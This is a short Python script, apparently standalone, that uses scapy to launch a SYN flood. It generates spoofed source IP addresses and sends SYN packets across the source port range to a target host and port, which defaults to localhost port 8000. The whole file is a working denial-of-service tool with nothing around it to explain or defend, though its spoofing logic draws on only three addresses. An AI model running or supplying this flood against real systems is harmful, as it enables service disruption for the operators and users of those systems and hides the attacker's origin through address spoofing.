from scapy.all import *
import random

def generate_ip():
	res = []
	print("Generating IP list...")
	for i in range(2,5):
		for j in range(2,5):
			for k in range(2,5):
				for l in range(2,254):
					tmpip = str(i) + '.'  + str(j) + '.' + str(k) + '.' + str(l)		
					res.append(tmpip)
	return res



def synFlood(tgt = "127.0.0.1", dport = 8000):
	srcList = generate_ip()
	for sPort in range(1024, 65535):
		index = random.randrange(3)
		ipLayer = IP(src = srcList[index], dst = tgt)
		tcpLayer = TCP(sport = sPort, dport = dport, flags = "S")
		packet = ipLayer / tcpLayer
		send(packet)

if __name__ == "__main__":
	synFlood("127.0.0.1", 8000)
